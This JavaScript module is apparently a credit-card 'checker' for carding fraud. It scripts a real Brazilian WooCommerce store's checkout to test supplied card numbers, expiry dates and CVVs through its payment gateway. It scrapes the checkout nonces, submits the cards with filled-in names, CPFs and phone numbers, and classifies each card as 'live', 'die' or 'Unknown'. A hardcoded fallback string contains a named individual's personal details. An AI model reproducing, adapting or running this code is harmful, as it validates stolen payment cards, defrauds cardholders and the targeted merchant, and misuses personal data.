let isRestest = false

function addPeople( {
  nonces,
  cc,
  dataPeople
}) {

return `billing_first_name=${(dataPeople.nome).split(" ")[0]}&billing_last_name=${(dataPeople.nome).split(" ")[1]}&billing_persontype=1&billing_cpf=${dataPeople.cpf}&billing_company=&billing_cnpj=&billing_ie=&billing_country=BR&billing_postcode=60025-001&billing_address_1=Rua+Senador+Pompeu&billing_number=232&billing_address_2=&billing_neighborhood=Jose+Bonifacio&billing_city=Fortaleza&billing_state=CE&billing_phone=${dataPeople.celular}&billing_cellphone=&billing_email=noop%40gmail.com&wcal_guest_capture_nonce=${nonces.nonceOne}&_wp_http_referer=%2Fcheckout%2F&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_postcode=60025-001&shipping_address_1=Rua+Ouvidor+Peleja&shipping_number=343&shipping_address_2=&shipping_neighborhood=&shipping_city=S%C3%A3o+Paulo&shipping_state=CE&order_comments=&shipping_method%5B0%5D=correios-sedex6&payment_method=rede_credit&rede_credit_number=${cc.numberCC}&rede_credit_holder_name=${dataPeople.nome}&rede_credit_expiry=${cc.monthCC}/${cc.yearCC}&rede_credit_cvc=${cc.cvvCC}&woocommerce-process-checkout-nonce=${nonces.nonceTwo}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review`

  return "billing_first_name=Carlene&billing_last_name=Conceicao&billing_persontype=1&billing_cpf=000.100.432-84&billing_company=&billing_cnpj=&billing_country=BR&billing_postcode=03007-000&billing_address_1=Av.+Merc%C3%BArio&billing_number=192&billing_address_2=&billing_neighborhood=&billing_city=S%C3%A3o+paulo&billing_state=SP&billing_phone=(11)+94412-4101&billing_email=noop%40gmail.com&order_comments=&shipping_method%5B0%5D=53&coupon_code=&payment_method=rede_credit&rede_credit_number="+cc.numberCC+"&rede_credit_installments=1&rede_credit_holder_name=CARLENE+CONCEICAO+GAMA+CARVALHO&rede_credit_expiry="+cc.monthCC+"/"+cc.yearCC+"&rede_credit_cvc="+cc.cvvCC+"&woocommerce-process-checkout-nonce="+nonces.noncesOne +"&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
}

export default async function Rede1( {
  searchData,
  request,
  dataBin,
  cc,
  checker,
  dataPeople
}) {

  let timeOfResponse = 0
  setInterval(function() {
    timeOfResponse++
  }, 1000);
  // adjustData, addData,data-Requests
  checker.headers.cookie = null
  const {
    headers
  } = await request({
      url: "https://tudooffice.com.br/?wc-ajax=add_to_cart",
      method: "POST",
      headers: checker.headers,
      form: checker.form
    })
  // retorna um objeto com um cookie q sera usado futuramente

  if (!headers?.["set-cookie"]) return {
    success: false,
    result: "o checker caiu, tente outro checker"
  }
  const cookie = searchData(/wp_woocommerce(.*?);/, headers["set-cookie"].toString(), 0)



  if (!cookie) return {
    success: false,
    result: "o checker caiu, tente outro checker"
  }
  //setando o cookie
  checker.headers.cookie = cookie

  const {
    body
  } = await request({
      url: "https://tudooffice.com.br/checkout/",
      method: "GET",
      headers: checker.headers
    })



  const nonces = {
    nonceOne: searchData(/name="wcal_guest_capture_nonce" value="(.*?)"/, body, 1),
    nonceTwo: searchData(/name="woocommerce-process-checkout-nonce" value="(.*?)"/, body, 1),
  }

try {
  dataPeople = JSON.parse(dataPeople)[0]
} catch (e) {
  return {
    success: false,
    result: "error ao carregar os dados do lara"
  }
}
  
  const paymont = await request({
    url: "https://tudooffice.com.br/?wc-ajax=checkout",
    method: "POST",
    headers: checker.headers,
    form: addPeople({
      nonces,
      cc,
      dataPeople
    })
  })

  const ccFinal = cc.numberCC+"|"+cc.monthCC+"|"+cc.yearCC+"|"+cc.cvvCC
  
  const bankCard = dataBin?.bank?.name ||  dataBin?.scheme + " " + dataBin?.brand || dataBin?.scheme
  
  if (paymont.body.includes("redirect")) return {
    success: true,
    result: {
      status: "live",
      cc: ccFinal,
      bin: ccFinal.slice(0, 6),
      bankAndLevel: bankCard,
      tymeOfResponse: timeOfResponse,
      debit: 16,
      dataPeople: dataPeople,
      by: "Noop"
    }
  }
  if (paymont.body.includes("Unauthorized") || paymont.body.includes("Unsuccessful.")) return {
    success: true,
    result: {
      status: "die",
      cc: ccFinal,
      bin: ccFinal.slice(0, 6),
      bankAndLevel: bankCard,
      tymeOfResponse: timeOfResponse,
      debit: 16,
      dataPeople:dataPeople,
      by: "Noop"
    }
  }

  if (!isRestest) {
    isRestest = true
    return Rede1( {
      searchData,
      request,
      dataBin,
      cc,
      checker
    })
  }
  isRestest = false
  console.log("ops essa é desconhecida ", paymont.body)
  return {
    success: true,
    result: {
      status: "Unknown",
      cc: ccFinal,
      bin: ccFinal.slice(0, 6),
      bankAndLevel: bankCard,
      tymeOfResponse: timeOfResponse,
      debit: 16,
      dataPeople:dataPeople,
      by: "Noop"
    }
  }

  console.log(e.message)
  // if (quantityTestCC < 2) return Rede1({
  //   searchData,
  //   request,
  //   dataBinAndResult,
  //   cc,
  //   checker
  // })

  console.log("error, verifique a proxy, ou a gate, erro in proxy : rede1")
  return {
    success: false,
    result: "problemas na hora de pagar"
  }




  // 🪙 #Aprovada » ✅ « (NUMERO|MÊS|ANO|CCV » @ 💳 BIN (BANCO E NÍVEL)[Transação Aprovada com Sucesso] 💰 DEBITOU [VALOR R$] @ Noop

  // {
  //   cc,
  //   request,
  //   people
  // }

}